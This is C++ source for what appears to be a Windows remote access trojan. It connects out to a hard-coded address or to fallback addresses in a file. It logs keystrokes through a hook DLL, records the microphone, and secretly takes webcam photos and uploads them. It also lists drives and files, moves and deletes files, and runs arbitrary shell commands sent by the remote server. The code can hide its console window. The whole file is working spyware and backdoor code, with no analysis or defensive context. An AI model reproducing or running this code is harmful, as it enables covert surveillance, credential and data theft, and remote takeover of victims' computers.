#include <winSock2.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <pthread.h>
#include <shlwapi.h>
#include <direct.h>
#include <tlhelp32.h>
#include <opencv2/opencv.hpp>
#include <winternl.h>
#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib, "winmm.lib")
using namespace cv;
#pragma warning(disable:4996)
#pragma warning(disable:4700)
#pragma warning(disable:4312)
#define DATA_BUFMAX 2048
#define DATA_BUFMIN 45
#define DATA_BUFMID 2000
#define PORT 9999
#define DEBUG
#ifndef DEBUG
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#endif // !DEBUG

typedef struct _WHO {
    int Num;
    char Name[20];
}Who;
typedef struct _SERVER {
    Who Who;// 谁发送的
    int Size;
    char Type[2];// 发送的类型
    char Command[10];
    char Info[DATA_BUFMID];// 要发送的内容
}SERVER;
typedef struct _FILE {
    FILE* fp;
    int FileSize;// 总大小
    int GetSize;// 得到的大小
    char name[200];
}SAVE_FILE;
// HOOK技术
void* Hook_Keyboard(void *arg) {
    if (fopen("keyboard.txt", "rb") == NULL) {
#ifdef DEBUG
        printf("hook已关闭\n");
#endif // DEBUG
        return (void*)1;
    }
    HMODULE hModule = LoadLibrary(TEXT("D:\\project\\c\\hook_keyboard\\x64\\Release\\hook_keyboard.dll"));
    if (hModule == NULL) { 
#ifdef DEBUG
        printf("获取DLL失败\n");
#endif // DEBUG
        return (void*)1;
    }
    typedef BOOL(*HOOK)();
    HOOK LoadHook = (HOOK)GetProcAddress(hModule, "LoadHook");
    HOOK UnloadHook = (HOOK)GetProcAddress(hModule, "UnloadHooK");
    if (LoadHook == NULL || UnloadHook == NULL) {
#ifdef DEBUG
        printf("获取DLL函数地址失败\n");
#endif // DEBUG
        return (void*)1;
    }
    LoadHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnloadHook();
}
// 录音
void* Tape(void* arg) {
    if (fopen("tape.txt", "rb") == NULL) {
#ifdef DEBUG
        printf("录音已关闭\n");
#endif // DEBUG
        return (void*)1;
    }
    HWAVEIN hWaveIn; // 输入设备
    WAVEFORMATEX waveform;
    waveform.wFormatTag = WAVE_FORMAT_PCM;
    waveform.nSamplesPerSec = 11025;//采样率
    waveform.wBitsPerSample = 16;//采样比特
    waveform.nChannels = 1;//采样声道数
    waveform.nBlockAlign = 2;//一个块的大小，采样bit的字节数乘以声道数
    waveform.nAvgBytesPerSec = 16000;//每秒的数据率，就是每秒能采集多少字节的数据
    waveform.cbSize = 0;
    int bufsize = 1024 * 100;
    BYTE* pBuffer;//采集音频时的数据缓存
    WAVEHDR wHdr; //采集音频时包含数据缓存的结构体
    wHdr.dwBufferLength = bufsize;
    wHdr.dwBytesRecorded = 0;
    wHdr.dwBytesRecorded = 0;
    wHdr.dwFlags = 0;
    wHdr.dwLoops = 1;
    HANDLE wait;
    wait = CreateEvent(NULL, 0, 0, NULL);
    waveInOpen(&hWaveIn, WAVE_MAPPER, &waveform, (DWORD_PTR)wait, 0L, CALLBACK_EVENT);
    SYSTEMTIME time;
    char TapeFileName[50] = { 0 };
    FILE* fp = NULL;
    while (1) {
        GetLocalTime(&time);
        sprintf(TapeFileName, "%02dM%02dD%02d-%02d.pcm", time.wMonth, time.wDay, time.wHour, time.wMinute);
        //printf("\n%s ", TapeFileName);
        fp = fopen(TapeFileName, "wb+");
#ifdef DEBUG
        int time = 30;
#else
        int time = 1800;
#endif // DEBUG
        for (int i = 0; i < time; i++) {
            pBuffer = new BYTE[bufsize];
            wHdr.lpData = (LPSTR)pBuffer;
            waveInPrepareHeader(hWaveIn, &wHdr, sizeof(WAVEHDR));//准备一个波形数据块头用于录音
            waveInAddBuffer(hWaveIn, &wHdr, sizeof(WAVEHDR));//指定波形数据块为录音输入缓存
            waveInStart(hWaveIn);//开始录音
            Sleep(1000);//等待声音录制1s
            waveInReset(hWaveIn);//停止录音
            fwrite(pBuffer, 1, wHdr.dwBytesRecorded, fp);
            delete[] pBuffer;
        }
        waveInClose(hWaveIn);
        fclose(fp);
    }
    return (void*)1;
}

int main(int argc,char* argv[]) {
    while (1) {
        pthread_t KeyBoardProc;
        pthread_create(&KeyBoardProc, NULL, Hook_Keyboard, NULL);
        pthread_detach(KeyBoardProc);
        pthread_t TapeProc;
        pthread_create(&TapeProc, NULL, Tape, NULL);
        pthread_detach(TapeProc);
        // 初始化
        FILE* fp = NULL;
        WSAData wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;
        SOCKET tcp_Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (tcp_Client == INVALID_SOCKET) return 0;
        {
            fp = fopen("keyboard.txt","r");
            if (fp != NULL) {
                fseek(fp, 0, SEEK_END);
                int FileSize = ftell(fp);
                if (FileSize >= 1024 * 1024 * 1024) {
                    remove("keyboard.txt");
                }
            }
            fp = NULL;
        }
        SAVE_FILE SaveFile;
        sockaddr_in addrServ;
        addrServ.sin_family = AF_INET;
        addrServ.sin_port = htons(PORT);
        addrServ.sin_addr.S_un.S_addr = inet_addr("192.168.0.103");
        fp = fopen("IP.txt", "r");
        while ((connect(tcp_Client, (LPSOCKADDR)&addrServ, sizeof(addrServ))) == SOCKET_ERROR) {
            if (fp != NULL) {
                char IP[50] = { 0 };
                if (fgets(IP, 50, fp) == NULL) {
                    fseek(fp, 0, SEEK_SET);
                    continue;
                }
                addrServ.sin_addr.S_un.S_addr = inet_addr(IP);
            }
#ifndef DEBUG
            sleep(240000);
#endif
        }
        if (fp != NULL) {
            fclose(fp);
            fp = NULL;
        }
        delete fp;
        SERVER Send_Structure;
        while (1) {
            RtlZeroMemory(&Send_Structure, sizeof(Send_Structure));
            char RecvInfo[DATA_BUFMAX] = { 0 };
            // 阻碍式接收
            if (recv(tcp_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
                //printf("已断开连接"); 
                break;
            }
            SERVER* Get_Structure = (SERVER*)&RecvInfo;// 解析
            // 初始化
            strcpy(Send_Structure.Type, "I");
            Send_Structure.Who.Num = Get_Structure->Who.Num;
            strcpy(Send_Structure.Who.Name, Get_Structure->Who.Name);
            //printf("Type:%s Command:%s Info:%s\n", Get_Structure->Type, Get_Structure->Command, Get_Structure->Info);
            if (strcmp(Get_Structure->Type, "F") == 0) {
                if (strcmp(Get_Structure->Command, "remove") == 0) {
                    if (remove(Get_Structure->Info) == 0) {
                        sprintf(Send_Structure.Info, "删除文件成功");
                    }
                    else {
                        sprintf(Send_Structure.Info, "删除文件失败，请检查路径是否正确");
                    }
                }
                else if (strcmp(Get_Structure->Command, "SendFile") == 0) {
                    FILE* fp = fopen(Get_Structure->Info, "rb");//以二进制方式打开文件
                    if (fp == NULL) {
                        sprintf(Send_Structure.Info, "打开文件失败，请检查文件路径是否正确");
                    }
                    else {
                        // 发送文件信息
                        fseek(fp, 0, SEEK_END);
                        int FileSize = ftell(fp);// 文件指针偏移量(单位:字节)
                        rewind(fp);
                        Send_Structure.Size = FileSize;
                        strcpy(Send_Structure.Type, "F");
                        strcpy(Send_Structure.Command, "FileInfo");
                        char* p;
                        strcpy(Send_Structure.Info, (p = strrchr(Get_Structure->Info, '\\')) ? p + 1 : Get_Structure->Info);
                        if (send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
                        // 发送文件
                        strcpy(Send_Structure.Type, "F");
                        strcpy(Send_Structure.Command, "RecvFile");
                        Send_Structure.Size = 0;
                        while (!feof(fp)) {
                            if (recv(tcp_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) goto start;
                            memset(Send_Structure.Info, 0, sizeof(Send_Structure.Info));
                            Send_Structure.Size = fread(Send_Structure.Info, sizeof(char), sizeof(Send_Structure.Info), fp);
                            send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0);
                            //printf("SendFileSize:%d/%d \n", FileSize,Send_Structure.Size);
                        }
                        fclose(fp);
                        strcpy(Send_Structure.Type, "I");
                        strcpy(Send_Structure.Info, "文件已发送完毕");
                    }
                }
                else if (strcmp(Get_Structure->Command, "FileInfo") == 0) {
                    SaveFile.fp = fopen(Get_Structure->Info, "wb+");
                    SaveFile.FileSize = Get_Structure->Size;
                    SaveFile.GetSize = 0;
                    // 反馈确认接收
                    strcpy(Send_Structure.Type, "F");
                    strcpy(Send_Structure.Info, "continue");
                    //printf("接收大小%d\n", Get_Structure->Size);
                }
                else if (strcmp(Get_Structure->Command, "RecvFile") == 0) {
                    if (SaveFile.fp == NULL) {
                        strcpy(Send_Structure.Type, "I");
                        strcpy(Send_Structure.Info, "未发送文件信息");
                        goto Send;
                    };
                    fwrite(Get_Structure->Info, sizeof(char), Get_Structure->Size, SaveFile.fp);
                    SaveFile.GetSize += Get_Structure->Size;
                    // 反馈确认接收
                    strcpy(Send_Structure.Type, "F");
                    strcpy(Send_Structure.Info, "continue");
                    //printf("%d %d %d\n", SaveFile.FileSize, SaveFile.GetSize, Get_Structure->Size);
                    if (SaveFile.FileSize == SaveFile.GetSize) {
                        fclose(SaveFile.fp);
                        SaveFile.fp = NULL;
                        SaveFile.FileSize = 0;
                        SaveFile.GetSize = 0;
                        memset(SaveFile.name, 0, sizeof(SaveFile.name));
                        strcpy(Send_Structure.Type, "I");
                        strcpy(Send_Structure.Info, "文件接收完毕");
                        goto Send;
                    }
                }
            }
            else if (strcmp(Get_Structure->Type, "L") == 0) {
                // pan
                if (strcmp(Get_Structure->Info, "pan") == 0) {
                    DWORD Size = MAX_PATH;
                    char Info[MAX_PATH] = { 0 };
                    DWORD Result = GetLogicalDriveStringsA(Size, Info);
                    if (Result > 0 && Result <= MAX_PATH) {
                        char* Drive = Info;
                        while (*Drive) {
                            strcat(Send_Structure.Info, Drive);
                            Drive += strlen(Drive) + 1;
                        }
                    }
                }
                else if (strcmp(Get_Structure->Command,"path") == 0) {
                    strcpy(Send_Structure.Type, "I");
                    char Path[200] = { 0 };
                    strcpy(Path, Get_Structure->Info);
                    char filePath[100] = { 0 };
                    strcpy(filePath, Get_Structure->Info);
                    strcat(Path, "\\*.*");
                    HANDLE file;
                    WIN32_FIND_DATA pNextInfo;
                    file = FindFirstFile(Path, &pNextInfo);
                    if (file == INVALID_HANDLE_VALUE) {
                        strcpy(Send_Structure.Type, "I");
                        strcpy(Send_Structure.Info, "文件搜索不到!");
                    }
                    else {
                        for (int i = 1; FindNextFile(file, &pNextInfo);i++) {
                            if (pNextInfo.cFileName[0] == '.') {
                                i--; 
                                continue;
                            }
                            SYSTEMTIME LastWriteTime, AccessTime, CreationTime;
                            FileTimeToSystemTime(&pNextInfo.ftLastWriteTime, &LastWriteTime);// 最后一次修改
                            FileTimeToSystemTime(&pNextInfo.ftLastAccessTime, &AccessTime);//  最后一次访问
                            FileTimeToSystemTime(&pNextInfo.ftCreationTime, &CreationTime);// 创建时间
                            sprintf(Send_Structure.Info, "第 %d 个文件: %s\\%s\t创建时间:%d年%d月%d日\t最后一次修改时间:%d年%d月%d日\t最后一次访问时间:%d年%d月%d日", i, filePath, pNextInfo.cFileName,CreationTime.wYear, CreationTime.wMonth, CreationTime.wDay, LastWriteTime.wYear, LastWriteTime.wMonth, LastWriteTime.wDay, AccessTime.wYear, AccessTime.wMonth, AccessTime.wDay);
                            // 发送
                            Send_Structure.Size = strlen(Send_Structure.Info);
                            strcpy(Send_Structure.Type, Send_Structure.Type);
                            strcpy(Send_Structure.Info, Send_Structure.Info);
                            if (send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
                            memset(Send_Structure.Info, 0, sizeof(Send_Structure.Info));
                        }
                    }
                    continue;
                }
                else if (strcmp(Get_Structure->Info, "systeminfo") == 0) {
                    char SystemName[255] = { 0 };
                    char UserName[255] = { 0 };
                    unsigned long size = 0;
                    GetComputerName(SystemName, &size);
                    GetUserName(UserName, &size);
                    sprintf(Send_Structure.Info, "Compute Name:\"%s\" , Now UserName:\"%s\"", SystemName, UserName);
                }
                else if (strcmp(Get_Structure->Info, "runpath") == 0) {
                    char Path[500] = { 0 };
                    getcwd(Path, sizeof(Path));
                    sprintf(Send_Structure.Info, "[请不要乱动这个目录下的txt文件!!!]目前运行路径:\n%s", Path);
                }
                else if (strcmp(Get_Structure->Info, "camera") == 0) {
                    VideoCapture camera;
                    camera.open(0);
                    if (!camera.isOpened()) {
                        sprintf(Send_Structure.Info, "打开默认摄像头失败,取消发送");
                    }
                    else {
                        char PhotoName[500] = {0};
                        cv::Mat frame;
                        camera >> frame;
                        if (frame.empty()) {
                            sprintf(Send_Structure.Info, "摄像头拍照失败,取消发送");
                        }
                        else {
                            SYSTEMTIME time;
                            GetLocalTime(&time);
                            sprintf(PhotoName, "\\%02d%02d%02d%02d.jpg", time.wMonth, time.wDay, time.wHour, time.wMinute);
                            char PhotoPath[500] = { 0 };
                            getcwd(PhotoPath, sizeof(PhotoPath));
                            strcat(PhotoPath, PhotoName);
                            cv::imwrite(PhotoPath, frame);
                            //sprintf(Send_Structure.Info, "成功,请及时删除照片。照片地址:%s", PhotoPath);
                            FILE* fp = fopen(PhotoPath, "rb");//以二进制方式打开文件
                            if (fp == NULL) {
                                sprintf(Send_Structure.Info, "打开文件失败，路径不正确:%s",PhotoPath);
                            }
                            else {
                                // 发送文件信息
                                fseek(fp, 0, SEEK_END);
                                int FileSize = ftell(fp);// 文件指针偏移量(单位:字节)
                                rewind(fp);
                                Send_Structure.Size = FileSize;
                                strcpy(Send_Structure.Type, "F");
                                strcpy(Send_Structure.Command, "FileInfo");
                                char* p;
                                strcpy(Send_Structure.Info, (p = strrchr(PhotoPath, '\\')) ? p + 1 : PhotoPath);
                                if (send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
                                // 发送文件
                                strcpy(Send_Structure.Type, "F");
                                strcpy(Send_Structure.Command, "RecvFile");
                                Send_Structure.Size = 0;
                                while (!feof(fp)) {
                                    if (recv(tcp_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
                                        remove(PhotoPath);
                                        goto start;
                                    }
                                    memset(Send_Structure.Info, 0, sizeof(Send_Structure.Info));
                                    Send_Structure.Size = fread(Send_Structure.Info, sizeof(char), sizeof(Send_Structure.Info), fp);
                                    send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0);
                                }
                                fclose(fp);
                                strcpy(Send_Structure.Type, "I");
                                if (remove(PhotoPath) == 0)
                                    sprintf(Send_Structure.Info, "文件已发送完毕,删除成功,文件在本机位置:%s",PhotoPath);
                                else sprintf(Send_Structure.Info, "文件已发送完毕,删除失败,文件在本机位置:%s", PhotoPath);
                            }
                        }
                    }
                }
                else if (strcmp(Get_Structure->Info, "pthread") == 0) {
                    if (pthread_kill(KeyBoardProc, 0) == 0) {
                        strcpy(Get_Structure->Info, "键盘监听已开启 ");
                    }
                    else {
                        strcpy(Get_Structure->Info, "键盘监听未开启 ");
                    }
                    if (pthread_kill(TapeProc, 0) == 0) {
                        strcat(Get_Structure->Info, "录音模式已开启 ");
                    }
                    else {
                        strcat(Get_Structure->Info, "录音模式未开启 ");
                    }
                }
            }
            else if (strcmp(Get_Structure->Type, "S") == 0) {
                if (strcmp(Get_Structure->Info, "FUCK") == 0) break;
                else if (strcmp(Get_Structure->Info, "keyborad") == 0) {
                    if (fopen("keyboard.txt", "rb") == NULL) {
                        fopen("keyboard.txt", "a");
                        sprintf(Send_Structure.Info, "HOOK KeyBoard 已设置为开启 ");
                    }
                    else {
                        sprintf(Send_Structure.Info, "HOOK KeyBoard 已设置为关闭 ");
                        remove("keyboard.txt");
                    }
                    strcat(Send_Structure.Info, "重启生效");
                }
                else if (strcmp(Get_Structure->Info, "tape") == 0) {
                    if (fopen("tape.txt", "rb") == NULL) {
                        fopen("tape.txt", "a");
                        sprintf(Send_Structure.Info, "录音 已设置为开启 ");
                    }
                    else {
                        remove("taoe.txt");
                        sprintf(Send_Structure.Info, "录音 已设置为关闭 ");
                    }
                    strcat(Send_Structure.Info, "重启生效");
                }
            }
            else if (strcmp(Get_Structure->Type, "C") == 0) {
                if (strcmp(Get_Structure->Command, "cmd") == 0) {
                    if (Get_Structure->Who.Num != 0) {
                        strcpy(Send_Structure.Info, "你没有执行的权力,拒绝执行");
                        goto Send;
                    }
                    HANDLE hRead;
                    HANDLE hWrite;
                    SECURITY_ATTRIBUTES sa = { sizeof(sa) };
                    sa.bInheritHandle = TRUE;
                    sa.lpSecurityDescriptor = NULL;
                    sa.nLength = sizeof(SECURITY_ANONYMOUS);
                    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
                        sprintf(Send_Structure.Info, "创建管道失败,取消执行");
                    }
                    else {
                        STARTUPINFO si;
                        PROCESS_INFORMATION pi;
                        ZeroMemory(&si, sizeof(si));
                        si.cb = sizeof(STARTUPINFO);
                        si.dwFlags = STARTF_USESTDHANDLES;
                        si.hStdInput = hRead;
                        si.hStdOutput = hWrite;
                        si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
                        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                        if (!CreateProcessA(NULL, Get_Structure->Info, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                            strcpy(Send_Structure.Info,"执行指令失败,取消执行");
                        }
                        else {
                            Sleep(1000);
                            WaitForSingleObject(pi.hThread, -1);
                            WaitForSingleObject(pi.hProcess, -1);
                            DWORD Size = 1;
                            if (!ReadFile(hRead, Send_Structure.Info, sizeof(Send_Structure.Info), &Size, NULL)) {
                                sprintf(Send_Structure.Info, "读取返回值失败,取消执行");
                            }
                        }
                        CloseHandle(hWrite);
                        CloseHandle(hRead);
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                }
            }
            Send:
            // 发送
            int Send_size = strlen(Send_Structure.Info);
            if (Send_size == 0) {
                strcpy(Send_Structure.Type, "I");
                strcpy(Send_Structure.Info, "没有对应的指令");
            }
            Send_Structure.Size = Send_size;
            //printf("%s\n", Send_Structure.Info);
            if (send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
        }
    start:
        if (pthread_kill(KeyBoardProc, 0) == 0) {
            pthread_cancel(KeyBoardProc);
        }
        if (pthread_kill(TapeProc, 0) == 0) {
            pthread_cancel(TapeProc);
        }
        closesocket(tcp_Client);
        WSACleanup();
        Sleep(1000);
    }
    return - 1;
}